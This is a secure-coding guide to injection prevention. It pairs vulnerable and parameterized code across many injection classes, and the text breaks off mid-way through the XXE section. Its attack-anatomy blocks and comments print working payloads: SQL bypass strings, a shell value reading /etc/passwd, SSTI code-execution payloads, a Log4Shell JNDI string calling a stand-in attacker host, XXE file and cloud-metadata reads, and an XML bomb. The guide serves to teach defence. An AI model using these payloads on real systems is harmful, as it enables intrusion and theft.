# Injection Prevention

> **Domain:** Security > Secure Coding > Injection Prevention
> **Difficulty:** Intermediate to Advanced
> **Last Updated:** 2026-03-10

## Why It Matters

Injection vulnerabilities have held the top position in the OWASP Top 10 for over a decade. An injection flaw allows an attacker to send untrusted data to an interpreter as part of a command or query. The interpreter executes the injected payload because it cannot distinguish between trusted code and attacker-controlled input. The consequence is total: data exfiltration, data destruction, authentication bypass, remote code execution, lateral movement, and full system compromise.

Every injection class shares the same root cause: **mixing control plane and data plane**. Whenever user-supplied data is concatenated into a string that is later interpreted -- whether as SQL, shell commands, LDAP queries, XML, HTTP headers, log entries, or template code -- an injection vulnerability exists. The universal defense is the same: **never concatenate user input into interpreted strings. Use parameterized APIs that separate code from data.**

This guide covers every major injection class, with vulnerable and secure code examples, CWE mappings, and layered defense strategies.

---

## Table of Contents

1. [SQL Injection (CWE-89)](#1-sql-injection-cwe-89)
2. [NoSQL Injection (CWE-943)](#2-nosql-injection-cwe-943)
3. [OS Command Injection (CWE-78)](#3-os-command-injection-cwe-78)
4. [LDAP Injection (CWE-90)](#4-ldap-injection-cwe-90)
5. [XPath Injection (CWE-643)](#5-xpath-injection-cwe-643)
6. [Server-Side Template Injection (CWE-1336)](#6-server-side-template-injection-ssti-cwe-1336)
7. [HTTP Header Injection / Response Splitting (CWE-113)](#7-http-header-injection--response-splitting-cwe-113)
8. [Log Injection (CWE-117)](#8-log-injection-cwe-117)
9. [Email Header Injection (CWE-93)](#9-email-header-injection-cwe-93)
10. [XML Injection / XXE (CWE-611)](#10-xml-injection--xxe-cwe-611)
11. [Expression Language Injection (CWE-917)](#11-expression-language-injection-cwe-917)
12. [GraphQL Injection (CWE-89 variant)](#12-graphql-injection)
13. [SSRF -- Server-Side Request Forgery (CWE-918)](#13-ssrf----server-side-request-forgery-cwe-918)
14. [Best Practices](#best-practices)
15. [Anti-Patterns](#anti-patterns)
16. [Enforcement Checklist](#enforcement-checklist)

---

## 1. SQL Injection (CWE-89)

**What it is:** An attacker inserts or manipulates SQL statements through application input. The database engine executes the injected SQL because user data is concatenated into the query string instead of being passed as a bound parameter.

**Variants:** Classic (in-band), blind (boolean-based), time-based blind, error-based, UNION-based, second-order (stored then executed later), out-of-band.

**Impact:** Full database read/write, authentication bypass, data exfiltration, privilege escalation, remote code execution (via xp_cmdshell, COPY TO, etc.).

### Attack Anatomy

```
Application code:
  query = "SELECT * FROM users WHERE email = '" + userInput + "'"

Legitimate input:
  userInput = "alice@example.com"
  query = "SELECT * FROM users WHERE email = 'alice@example.com'"

Malicious input (classic):
  userInput = "' OR '1'='1"
  query = "SELECT * FROM users WHERE email = '' OR '1'='1'"
  -- Returns ALL users

Malicious input (UNION-based):
  userInput = "' UNION SELECT username, password FROM admin_users --"
  query = "SELECT * FROM users WHERE email = '' UNION SELECT username, password FROM admin_users --'"
  -- Exfiltrates admin credentials

Malicious input (time-based blind):
  userInput = "' OR IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0) --"
  -- If response takes 5 seconds, attacker knows the MySQL version starts with '5'

Second-order injection:
  Step 1: User registers with username "admin'--"
  Step 2: Application stores the username in the database (no injection yet)
  Step 3: Later, application uses the stored username in another query:
    query = "UPDATE users SET email = '" + newEmail + "' WHERE username = '" + storedUsername + "'"
    -- storedUsername is "admin'--", so the query becomes:
    "UPDATE users SET email = 'attacker@evil.com' WHERE username = 'admin'--'"
    -- Attacker changes the admin's email
```

### Vulnerable Code Examples

**TypeScript (pg -- raw query):**

```typescript
// VULNERABLE: String concatenation into SQL
import { Pool } from "pg";

const pool = new Pool();

async function getUser(email: string) {
  // NEVER DO THIS -- attacker controls `email`
  const result = await pool.query(
    `SELECT * FROM users WHERE email = '${email}'`
  );
  return result.rows[0];
}
```

**Python (psycopg2 -- string formatting):**

```python
# VULNERABLE: f-string / format() in SQL
import psycopg2

def get_user(email: str):
    conn = psycopg2.connect(DSN)
    cur = conn.cursor()
    # NEVER DO THIS
    cur.execute(f"SELECT * FROM users WHERE email = '{email}'")
    return cur.fetchone()
```

**Go (database/sql -- fmt.Sprintf):**

```go
// VULNERABLE: fmt.Sprintf into SQL
func getUser(db *sql.DB, email string) (*User, error) {
    // NEVER DO THIS
    query := fmt.Sprintf("SELECT * FROM users WHERE email = '%s'", email)
    row := db.QueryRow(query)
    // ...
}
```

**Java (JDBC -- Statement with concatenation):**

```java
// VULNERABLE: String concatenation with Statement
public User getUser(String email) throws SQLException {
    Statement stmt = connection.createStatement();
    // NEVER DO THIS
    ResultSet rs = stmt.executeQuery(
        "SELECT * FROM users WHERE email = '" + email + "'"
    );
    return mapUser(rs);
}
```

**C# (SqlCommand -- string interpolation):**

```csharp
// VULNERABLE: String interpolation into SQL
public User GetUser(string email)
{
    using var cmd = new SqlCommand(
        // NEVER DO THIS
        $"SELECT * FROM users WHERE email = '{email}'",
        connection
    );
    using var reader = cmd.ExecuteReader();
    return MapUser(reader);
}
```

**PHP (mysqli -- direct concatenation):**

```php
// VULNERABLE: Concatenation into SQL
function getUser($email) {
    global $conn;
    // NEVER DO THIS
    $result = $conn->query("SELECT * FROM users WHERE email = '$email'");
    return $result->fetch_assoc();
}
```

### Secure Code Examples

**TypeScript (pg -- parameterized query):**

```typescript
// SECURE: Parameterized query -- $1 is a placeholder, not concatenation
async function getUser(email: string) {
  const result = await pool.query(
    "SELECT id, email, name FROM users WHERE email = $1",
    [email]
  );
  return result.rows[0];
}
```

**TypeScript (Prisma ORM):**

```typescript
// SECURE: ORM with type-safe queries -- parameters are always bound
async function getUser(email: string) {
  return prisma.user.findUnique({
    where: { email },
    select: { id: true, email: true, name: true },
  });
}

// SECURE: Even raw queries in Prisma use tagged templates that auto-parameterize
async function searchUsers(namePattern: string) {
  return prisma.$queryRaw`
    SELECT id, email, name FROM users WHERE name ILIKE ${`%${namePattern}%`}
  `;
  // Prisma's tagged template literal automatically creates a parameterized query
}

// CAUTION: Prisma's $queryRawUnsafe DOES allow injection -- never use with user input
// NEVER: prisma.$queryRawUnsafe(`SELECT * FROM users WHERE name = '${name}'`)
```

**Python (psycopg2 -- parameterized query):**

```python
# SECURE: %s placeholder with tuple parameter
def get_user(email: str):
    conn = psycopg2.connect(DSN)
    cur = conn.cursor()
    cur.execute("SELECT id, email, name FROM users WHERE email = %s", (email,))
    return cur.fetchone()
```

**Python (SQLAlchemy ORM):**

```python
# SECURE: ORM with bound parameters
from sqlalchemy import select
from models import User

def get_user(session: Session, email: str) -> User | None:
    stmt = select(User).where(User.email == email)
    return session.execute(stmt).scalar_one_or_none()

# SECURE: Even text() queries can be parameterized
from sqlalchemy import text

def search_users(session: Session, name_pattern: str) -> list[User]:
    stmt = text("SELECT * FROM users WHERE name ILIKE :pattern")
    result = session.execute(stmt, {"pattern": f"%{name_pattern}%"})
    return result.fetchall()
```

**Go (database/sql -- parameterized query):**

```go
// SECURE: $1 placeholder with argument binding
func getUser(db *sql.DB, email string) (*User, error) {
    row := db.QueryRow(
        "SELECT id, email, name FROM users WHERE email = $1",
        email,
    )
    var u User
    err := row.Scan(&u.ID, &u.Email, &u.Name)
    return &u, err
}
```

**Go (sqlx -- named parameters):**

```go
// SECURE: Named parameters with sqlx
func searchUsers(db *sqlx.DB, name string) ([]User, error) {
    var users []User
    err := db.Select(&users,
        "SELECT id, email, name FROM users WHERE name ILIKE $1",
        "%"+name+"%",
    )
    return users, err
}
```

**Java (JDBC PreparedStatement):**

```java
// SECURE: PreparedStatement with parameter binding
public User getUser(String email) throws SQLException {
    PreparedStatement pstmt = connection.prepareStatement(
        "SELECT id, email, name FROM users WHERE email = ?"
    );
    pstmt.setString(1, email);
    ResultSet rs = pstmt.executeQuery();
    return mapUser(rs);
}
```

**C# (SqlCommand with parameters):**

```csharp
// SECURE: SqlParameter for parameterized queries
public User GetUser(string email)
{
    using var cmd = new SqlCommand(
        "SELECT id, email, name FROM users WHERE email = @Email",
        connection
    );
    cmd.Parameters.AddWithValue("@Email", email);
    using var reader = cmd.ExecuteReader();
    return MapUser(reader);
}
```

**PHP (PDO with prepared statements):**

```php
// SECURE: PDO prepared statement with bound parameters
function getUser(PDO $pdo, string $email): ?array {
    $stmt = $pdo->prepare("SELECT id, email, name FROM users WHERE email = :email");
    $stmt->execute(['email' => $email]);
    return $stmt->fetch(PDO::FETCH_ASSOC) ?: null;
}
```

### Defense Layers for SQL Injection

1. **Parameterized queries** -- the primary defense. Use always.
2. **ORM with safe query builders** -- Prisma, SQLAlchemy, GORM, Hibernate. Beware raw query escape hatches.
3. **Input validation** -- validate type, length, format, and allowed characters before the query layer.
4. **Stored procedures** -- can provide an additional boundary, but only if the stored procedure itself uses parameterized queries internally. A stored procedure that concatenates strings is still vulnerable.
5. **Least privilege database user** -- even if injection occurs, the attacker can only do what the database user is permitted to do. No DROP TABLE if the user lacks that grant.
6. **WAF rules** -- a Web Application Firewall can block common SQL injection patterns. This is a detection/mitigation layer, not a prevention layer. Never rely on WAF alone.

### Second-Order Injection Defense

```typescript
// SECURE: Treat ALL data as untrusted, even data read from your own database
async function updateEmail(userId: string, newEmail: string) {
  // The userId was read from the database, but it could contain injected content
  // from a prior write. Always parameterize regardless of data source.
  await pool.query(
    "UPDATE users SET email = $1 WHERE id = $2",
    [newEmail, userId]
  );
}
```

The rule is simple: **parameterize every query, every time, regardless of where the data comes from.** Data from your own database, from environment variables, from config files -- all must be parameterized. The cost is zero and the protection is absolute.

---

## 2. NoSQL Injection (CWE-943)

**What it is:** An attacker manipulates NoSQL query operators by injecting objects or special operators ($gt, $ne, $regex, $where) through JSON input. NoSQL databases like MongoDB interpret these operators when they appear in query documents.

**Impact:** Authentication bypass, data exfiltration, denial of service via expensive regex.

### Attack Anatomy

```
Express.js route receives JSON body:
  POST /login
  Body: { "username": "admin", "password": { "$ne": "" } }

Application code:
  db.users.findOne({ username: req.body.username, password: req.body.password })

Resulting MongoDB query:
  db.users.findOne({ username: "admin", password: { $ne: "" } })
  -- Matches admin user because password is NOT EQUAL to "" (always true)
  -- Authentication bypassed without knowing the password
```

### Vulnerable Code

```typescript
// VULNERABLE: Passes req.body directly to MongoDB query
app.post("/login", async (req, res) => {
  const user = await db.collection("users").findOne({
    username: req.body.username,
    password: req.body.password, // If password is { "$ne": "" }, login bypassed
  });

  if (user) {
    res.json({ token: createToken(user) });
  } else {
    res.status(401).json({ error: "Invalid credentials" });
  }
});
```

### Secure Code

```typescript
// SECURE: Validate and coerce input types before querying
import { z } from "zod";
import bcrypt from "bcrypt";

const LoginSchema = z.object({
  username: z.string().min(1).max(100),
  password: z.string().min(1).max(128), // z.string() rejects objects, arrays, operators
});

app.post("/login", async (req, res) => {
  // Step 1: Schema validation rejects operator injection
  const parsed = LoginSchema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "Invalid input" });
  }

  // Step 2: Query with validated string, not raw body
  const user = await db.collection("users").findOne({
    username: parsed.data.username,
  });

  if (!user) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  // Step 3: Never store or compare passwords as plain text
  const passwordMatch = await bcrypt.compare(parsed.data.password, user.passwordHash);
  if (!passwordMatch) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  res.json({ token: createToken(user) });
});
```

### Defense Layers for NoSQL Injection

1. **Schema validation (Zod, Joi, ajv)** -- validate that every field is the expected type. A `password` field must be a string, never an object.
2. **Explicit type casting** -- `String(req.body.username)` forces the value to a string, stripping operator objects.
3. **Avoid $where and $expr with user input** -- these operators evaluate JavaScript or expressions server-side.
4. **Use MongoDB driver's strict mode** -- newer drivers reject queries with `$`-prefixed keys in user-supplied data.
5. **Hash passwords** -- never compare passwords directly in queries. Fetch the user by username, then compare the hash in application code.

---

## 3. OS Command Injection (CWE-78)

**What it is:** An attacker injects operating system commands through application input that is passed to a shell interpreter. The shell executes the injected commands with the application's privileges.

**Impact:** Remote code execution, file system access, reverse shells, lateral movement, full server compromise.

### Attack Anatomy

```
Application code:
  exec("ping -c 4 " + userInput)

Malicious input:
  userInput = "8.8.8.8; cat /etc/passwd"
  Executed: ping -c 4 8.8.8.8; cat /etc/passwd
  -- The shell splits on ";" and executes both commands

Other shell metacharacters:
  ;   -- command separator
  &&  -- execute second if first succeeds
  ||  -- execute second if first fails
  |   -- pipe output to next command
  $() -- command substitution
  `   -- backtick command substitution
  >   -- redirect output to file
  <   -- redirect input from file
```

### Vulnerable Code

**TypeScript (child_process.exec):**

```typescript
// VULNERABLE: exec() passes string to shell for interpretation
import { exec } from "child_process";

app.get("/ping", (req, res) => {
  const host = req.query.host;
  // NEVER DO THIS -- shell interprets metacharacters
  exec(`ping -c 4 ${host}`, (error, stdout) => {
    res.send(stdout);
  });
});
```

**Python (subprocess with shell=True):**

```python
# VULNERABLE: shell=True passes string to /bin/sh
import subprocess

def ping_host(host: str) -> str:
    # NEVER DO THIS
    result = subprocess.run(f"ping -c 4 {host}", shell=True, capture_output=True, text=True)
    return result.stdout
```

**Go (os/exec with sh -c):**

```go
// VULNERABLE: Passing user input through shell
func pingHost(host string) (string, error) {
    // NEVER DO THIS -- sh -c interprets shell metacharacters
    cmd := exec.Command("sh", "-c", "ping -c 4 "+host)
    out, err := cmd.Output()
    return string(out), err
}
```

### Secure Code

**TypeScript (child_process.execFile):**

```typescript
// SECURE: execFile does NOT invoke a shell -- arguments are passed directly
import { execFile } from "child_process";

// Step 1: Validate input against an allowlist
const HOST_REGEX = /^[a-zA-Z0-9][a-zA-Z0-9.\-]{0,253}[a-zA-Z0-9]$/;

app.get("/ping", (req, res) => {
  const host = req.query.host as string;

  if (!HOST_REGEX.test(host)) {
    return res.status(400).json({ error: "Invalid hostname" });
  }

  // Step 2: execFile passes each argument separately -- no shell interpretation
  execFile("ping", ["-c", "4", host], { timeout: 10000 }, (error, stdout) => {
    res.send(stdout);
  });
});
```

**Python (subprocess with shell=False and argument list):**

```python
# SECURE: shell=False (default) with argument list
import subprocess
import re

HOST_REGEX = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9.\-]{0,253}[a-zA-Z0-9]$")

def ping_host(host: str) -> str:
    if not HOST_REGEX.match(host):
        raise ValueError("Invalid hostname")

    # Arguments as a list, shell=False (default) -- no shell interpretation
    result = subprocess.run(
        ["ping", "-c", "4", host],
        capture_output=True,
        text=True,
        timeout=10,
    )
    return result.stdout
```

**Go (os/exec with argument list):**

```go
// SECURE: exec.Command with separate arguments -- no shell invocation
func pingHost(host string) (string, error) {
    hostRegex := regexp.MustCompile(`^[a-zA-Z0-9][a-zA-Z0-9.\-]{0,253}[a-zA-Z0-9]$`)
    if !hostRegex.MatchString(host) {
        return "", fmt.Errorf("invalid hostname: %s", host)
    }

    // Each argument is separate -- Go does NOT invoke a shell
    cmd := exec.Command("ping", "-c", "4", host)
    out, err := cmd.Output()
    return string(out), err
}
```

### Defense Layers for OS Command Injection

1. **Avoid executing shell commands entirely** -- use language-native libraries instead (net.Dial for connectivity checks, os.Stat for file checks).
2. **Use execFile / argument lists** -- never pass a single string through a shell. Always pass command and arguments as separate array elements.
3. **Never use shell=True** (Python), exec() (Node.js), or sh -c (Go) with user input.
4. **Input validation with allowlists** -- restrict input to known-safe characters (alphanumeric, dots, hyphens for hostnames).
5. **Allowlist the commands themselves** -- only permit a specific set of commands. Reject anything not on the list.
6. **Run with minimal privileges** -- the process executing commands should have the least privileges possible. Use a dedicated service account, not root.

---

## 4. LDAP Injection (CWE-90)

**What it is:** An attacker manipulates LDAP queries by injecting special characters (parentheses, asterisks, backslashes, NUL bytes) into search filters or distinguished names. The LDAP server interprets the injected content as query syntax.

**Impact:** Authentication bypass, unauthorized directory access, data exfiltration of user/group information.

### Vulnerable Code

```python
# VULNERABLE: String formatting into LDAP filter
import ldap

def authenticate_user(username: str, password: str) -> bool:
    conn = ldap.initialize("ldap://ldap.example.com")
    # NEVER DO THIS -- attacker can inject LDAP filter operators
    search_filter = f"(&(uid={username})(userPassword={password}))"
    # Input: username = "admin)(|(uid=*"
    # Filter becomes: (&(uid=admin)(|(uid=*)(userPassword=anything)))
    # Matches all users -- authentication bypassed
    results = conn.search_s("dc=example,dc=com", ldap.SCOPE_SUBTREE, search_filter)
    return len(results) > 0
```

### Secure Code

```python
# SECURE: Escape special characters in LDAP filter values
import ldap
from ldap.filter import escape_filter_chars

def authenticate_user(username: str, password: str) -> bool:
    conn = ldap.initialize("ldaps://ldap.example.com")  # Use LDAPS (TLS)

    # Step 1: Escape special LDAP characters: * ( ) \ NUL
    safe_username = escape_filter_chars(username)

    # Step 2: Search for user by username only (not password in filter)
    search_filter = f"(uid={safe_username})"
    results = conn.search_s("dc=example,dc=com", ldap.SCOPE_SUBTREE, search_filter)

    if len(results) != 1:
        return False

    user_dn = results[0][0]

    # Step 3: Verify password via LDAP bind (not filter comparison)
    try:
        conn.simple_bind_s(user_dn, password)
        return True
    except ldap.INVALID_CREDENTIALS:
        return False
```

### Key LDAP Escaping Rules

Characters that must be escaped in LDAP filter values (RFC 4515):
- `*` -> `\2a`
- `(` -> `\28`
- `)` -> `\29`
- `\` -> `\5c`
- NUL -> `\00`

Characters that must be escaped in LDAP distinguished names (RFC 4514):
- `,` `+` `"` `\` `<` `>` `;` and leading/trailing spaces or `#`.

Always use the LDAP library's built-in escaping functions. Never write custom escaping.

---

## 5. XPath Injection (CWE-643)

**What it is:** An attacker manipulates XPath queries used to search XML documents by injecting XPath syntax through user input. Similar to SQL injection but targeting XML data stores.

**Impact:** Authentication bypass, unauthorized data access from XML documents.

### Vulnerable Code

```java
// VULNERABLE: String concatenation into XPath expression
import javax.xml.xpath.*;

public boolean authenticate(String username, String password) throws Exception {
    XPathFactory factory = XPathFactory.newInstance();
    XPath xpath = factory.newXPath();
    // NEVER DO THIS
    String expression = "//user[username='" + username + "' and password='" + password + "']";
    // Input: username = "admin' or '1'='1" => bypasses authentication
    NodeList nodes = (NodeList) xpath.evaluate(expression, document, XPathConstants.NODESET);
    return nodes.getLength() > 0;
}
```

### Secure Code

```java
// SECURE: Use XPath variables with a resolver to parameterize queries
import javax.xml.xpath.*;

public boolean authenticate(String username, String password) throws Exception {
    XPathFactory factory = XPathFactory.newInstance();
    XPath xpath = factory.newXPath();

    // Define variable resolver to bind parameters safely
    xpath.setXPathVariableResolver(variableName -> {
        switch (variableName.getLocalPart()) {
            case "username": return username;
            case "password": return password;
            default: return null;
        }
    });

    // Use $variables -- values are bound, not concatenated
    String expression = "//user[username=$username and password=$password]";
    NodeList nodes = (NodeList) xpath.evaluate(expression, document, XPathConstants.NODESET);
    return nodes.getLength() > 0;
}
```

If the XPath library does not support parameterization, escape single quotes by doubling them and validate input against a strict allowlist.

---

## 6. Server-Side Template Injection (SSTI) (CWE-1336)

**What it is:** An attacker injects template directives into a server-side template engine. The engine evaluates the injected expression, leading to information disclosure or remote code execution. This occurs when user input is embedded directly into a template string rather than passed as a template variable.

**Impact:** Remote code execution, full server compromise, file system access, information disclosure.

### Attack Anatomy

```
Jinja2 (Python):
  User input: {{ 7 * 7 }}
  If rendered as template: outputs "49" -- confirms SSTI
  Escalation: {{ ''.__class__.__mro__[1].__subclasses__() }}
  -- Enumerates Python classes, finds os.popen, executes commands

Twig (PHP):
  User input: {{ '/etc/passwd'|file_excerpt(1,30) }}
  -- Reads system files

Pug (Node.js):
  User input: #{root.process.mainModule.require('child_process').execSync('id')}
  -- Executes system commands
```

### Vulnerable Code

```python
# VULNERABLE: User input rendered AS a template, not IN a template
from jinja2 import Environment

env = Environment()

def render_greeting(user_input: str) -> str:
    # NEVER DO THIS -- user_input is treated as Jinja2 code
    template = env.from_string(f"Hello {user_input}!")
    return template.render()
    # If user_input = "{{ config.items() }}", it dumps the app config
    # If user_input = "{{ ''.__class__.__mro__[1].__subclasses__() }}", RCE is possible
```

```javascript
// VULNERABLE: User input concatenated into Pug template
const pug = require("pug");

app.get("/greet", (req, res) => {
  const name = req.query.name;
  // NEVER DO THIS
  const html = pug.render(`h1 Hello ${name}`);
  res.send(html);
});
```

### Secure Code

```python
# SECURE: User input passed as a template VARIABLE, not as template CODE
from jinja2 import Environment, select_autoescape

env = Environment(autoescape=select_autoescape(["html"]))

def render_greeting(user_input: str) -> str:
    # Template is fixed code. User input is data passed to render().
    template = env.from_string("Hello {{ name }}!")
    return template.render(name=user_input)
    # Even if user_input = "{{ config }}", it is output as the literal string "{{ config }}"
```

```javascript
// SECURE: Pass user input as a local variable, not inline
const pug = require("pug");

const greetTemplate = pug.compile("h1 Hello #{name}");

app.get("/greet", (req, res) => {
  const html = greetTemplate({ name: req.query.name });
  res.send(html);
});
```

### Defense Layers for SSTI

1. **Never pass user input to template compilation functions** -- `from_string()`, `compile()`, `render()` with inline data.
2. **Always pass user input as template variables** -- `render(name=value)`, `{ locals: { name: value } }`.
3. **Use sandboxed template environments** -- Jinja2's `SandboxedEnvironment` restricts attribute access.
4. **Disable dangerous filters and globals** -- remove `attr`, `map`, and direct access to Python builtins.
5. **Use logic-less template engines** -- Mustache and Handlebars have no expression evaluation beyond simple property access.
6. **Content Security Policy** -- even if SSTI produces injected HTML, CSP limits the damage.

---

## 7. HTTP Header Injection / Response Splitting (CWE-113)

**What it is:** An attacker injects CRLF (Carriage Return + Line Feed: `\r\n`) characters into HTTP headers. This allows injecting additional headers or splitting the response to inject an entirely new HTTP response body.

**Impact:** Cache poisoning, cross-site scripting via injected headers, session fixation, redirect hijacking.

### Vulnerable Code

```typescript
// VULNERABLE: User input directly in HTTP header
app.get("/redirect", (req, res) => {
  const url = req.query.url as string;
  // NEVER DO THIS -- if url contains \r\n, attacker injects headers
  // Input: "http://safe.com\r\nSet-Cookie: admin=true"
  // Response headers:
  //   Location: http://safe.com
  //   Set-Cookie: admin=true    <-- injected header
  res.setHeader("Location", url);
  res.status(302).end();
});
```

### Secure Code

```typescript
// SECURE: Validate and sanitize header values
import { URL } from "url";

const ALLOWED_REDIRECT_HOSTS = new Set(["app.example.com", "www.example.com"]);

app.get("/redirect", (req, res) => {
  const rawUrl = req.query.url as string;

  // Step 1: Reject CRLF characters
  if (/[\r\n]/.test(rawUrl)) {
    return res.status(400).json({ error: "Invalid URL" });
  }

  // Step 2: Parse and validate URL
  let parsed: URL;
  try {
    parsed = new URL(rawUrl);
  } catch {
    return res.status(400).json({ error: "Invalid URL" });
  }

  // Step 3: Allowlist redirect destinations
  if (!ALLOWED_REDIRECT_HOSTS.has(parsed.hostname)) {
    return res.status(400).json({ error: "Redirect not allowed" });
  }

  res.redirect(302, parsed.toString());
});
```

### Defense Layers for Header Injection

1. **Reject CRLF characters** -- strip or reject any input containing `\r` or `\n` before setting headers.
2. **Use framework-provided redirect methods** -- most modern frameworks sanitize header values automatically.
3. **Allowlist redirect destinations** -- never redirect to an arbitrary user-supplied URL.
4. **Validate all values set in headers** -- Content-Disposition filenames, custom headers, cookie values.

---

## 8. Log Injection (CWE-117)

**What it is:** An attacker injects crafted content into log files by including newlines, control characters, or log format strings in application input. This allows forging log entries, hiding evidence of attacks, or exploiting log processing tools. The Log4Shell vulnerability (CVE-2021-44228) demonstrated that log injection can lead to remote code execution when log frameworks evaluate expressions in logged data.

**Impact:** Log forgery, evidence tampering, exploitation of log processing pipelines, remote code execution (Log4Shell).

### Attack Anatomy

```
Application logs:
  logger.info("Login attempt for user: " + username)

Malicious input:
  username = "admin\n2025-03-10 INFO Login successful for user: admin"

Log output:
  2025-03-10 INFO Login attempt for user: admin
  2025-03-10 INFO Login successful for user: admin    <-- forged entry

Log4Shell (CVE-2021-44228):
  username = "${jndi:ldap://attacker.com/exploit}"
  Log4j evaluates the JNDI lookup, connects to attacker's server, downloads and executes payload
```

### Vulnerable Code

```typescript
// VULNERABLE: User input logged with string interpolation
app.post("/login", (req, res) => {
  const username = req.body.username;
  // NEVER DO THIS -- newlines in username create forged log entries
  console.log(`Login attempt for user: ${username}`);
  // Log4Shell equivalent: if using a Java log framework that evaluates expressions
});
```

### Secure Code

```typescript
// SECURE: Structured logging -- user input in data fields, not message string
import pino from "pino";

const logger = pino({ level: "info" });

app.post("/login", (req, res) => {
  const username = req.body.username;

  // Step 1: Sanitize control characters for log safety
  const safeUsername = username.replace(/[\x00-\x1f\x7f]/g, "");

  // Step 2: Structured logging -- user data goes in a field, not the message
  logger.info({ username: safeUsername, ip: req.ip }, "login_attempt");
  // Output: {"level":30,"time":1710000000,"username":"admin","ip":"1.2.3.4","msg":"login_attempt"}
  // Even if username contains special chars, they are JSON-encoded, not interpreted
});
```

```python
# SECURE: Python structured logging
import logging
import json

logger = logging.getLogger(__name__)

def log_login_attempt(username: str, ip: str) -> None:
    # Strip control characters
    safe_username = "".join(c for c in username if c.isprintable())

    # Use structured logging with extra fields
    logger.info(
        "login_attempt",
        extra={"username": safe_username, "ip": ip},
    )
```

### Defense Layers for Log Injection

1. **Use structured logging (JSON)** -- pino, winston (JSON mode), structlog (Python), slog (Go). Data fields are JSON-encoded, preventing injection.
2. **Strip control characters** -- remove or encode newlines (`\n`, `\r`), tabs, and other control characters from logged user input.
3. **Never evaluate expressions in log messages** -- disable JNDI lookups in Log4j (`log4j2.formatMsgNoLookups=true`), use Log4j 2.17+ or migrate away from Log4j.
4. **Treat logs as sensitive data** -- restrict access, monitor for tampering, ship to immutable external storage.
5. **Never log secrets** -- passwords, tokens, API keys, and PII must never appear in logs.

---

## 9. Email Header Injection (CWE-93)

**What it is:** An attacker injects additional email headers (CC, BCC, Subject, or MIME boundaries) through form fields that are used to construct email messages. By injecting newline characters followed by header names, the attacker can add arbitrary recipients, turning a contact form into a spam relay.

**Impact:** Spam relay abuse, phishing from your domain, reputation damage, email blacklisting.

### Vulnerable Code

```python
# VULNERABLE: User input used directly in email headers
import smtplib
from email.mime.text import MIMEText

def send_contact_form(sender_email: str, subject: str, message: str) -> None:
    msg = MIMEText(message)
    msg["From"] = "noreply@example.com"
    msg["To"] = "support@example.com"
    msg["Subject"] = subject  # User controls subject
    msg["Reply-To"] = sender_email  # User controls Reply-To

    # If sender_email = "attacker@evil.com\r\nBcc: victim1@example.com,victim2@example.com"
    # The email is sent to the BCC recipients -- spam relay achieved

    with smtplib.SMTP("localhost") as server:
        server.send_message(msg)
```

### Secure Code

```python
# SECURE: Validate and reject header injection attempts
import re
import smtplib
from email.mime.text import MIMEText

# Reject any input containing CRLF, CR, or LF
HEADER_INJECTION_REGEX = re.compile(r"[\r\n]")

# Validate email format
EMAIL_REGEX = re.compile(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$")

def send_contact_form(sender_email: str, subject: str, message: str) -> None:
    # Step 1: Reject CRLF in any header-bound field
    if HEADER_INJECTION_REGEX.search(sender_email):
        raise ValueError("Invalid email address")
    if HEADER_INJECTION_REGEX.search(subject):
        raise ValueError("Invalid subject")

    # Step 2: Validate email format
    if not EMAIL_REGEX.match(sender_email):
        raise ValueError("Invalid email format")

    # Step 3: Limit subject length
    if len(subject) > 200:
        raise ValueError("Subject too long")

    msg = MIMEText(message[:10000])  # Limit message length
    msg["From"] = "noreply@example.com"
    msg["To"] = "support@example.com"
    msg["Subject"] = subject
    msg["Reply-To"] = sender_email

    with smtplib.SMTP("localhost") as server:
        server.send_message(msg)
```

---

## 10. XML Injection / XXE (CWE-611)

**What it is:** XML External Entity (XXE) injection exploits XML parsers that process external entity references in XML input. An attacker defines an external entity that reads local files, makes network requests, or triggers denial of service. The Billion Laughs attack (XML bomb) uses nested entity expansion to consume memory and crash the parser.

**Impact:** Local file disclosure, SSRF via XML parser, denial of service, remote code execution (rare).

### Attack Anatomy

```xml
<!-- XXE: Read local files -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
<!-- The parser replaces &xxe; with the contents of /etc/passwd -->

<!-- XXE: SSRF via XML parser -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<!-- The parser fetches AWS instance metadata -->

<!-- Billion Laughs: Denial of Service -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!-- ... each level multiplies by 10, lol9 = 10^9 "lol" strings = gigabytes of memory -->
]>
<data>&lol4;</data>
```

### Vulnerable Code

```python
# VULNERABLE: Default XML parser processes external entities
from lxml import etree

def parse_user_xml(xml_string: str) -> dict:
    # NEVER DO THIS -- lxml processes external entities by default
    doc = etree.fromstring(xml_string)
    return {"name": doc.find("name").text}
```

```java
// VULNERABLE: DocumentBuilderFactory with default settings
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// Default settings allow external entities and DTDs
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
```

### Secure Code

```python
# SECURE: Disable DTD processing and external entities
from lxml import etree

def parse_user_xml(xml_string: str) -> dict:
    parser = etree.XMLParser(
        resolve_entities=False,  # Do not resolve entities
        no_network=True,         # Do not fetch external resources
        dtd_validation=False,    # Do not validate against DTD
        load_dtd=False,          # Do not even load the DTD
    )
    doc = etree.fromstring(xml_string.encode(), parser=parser)
    return {"name": doc.find("name").text}
```

```java
// SECURE: Disable external entities and DTDs
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// Disable all external entity processing
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
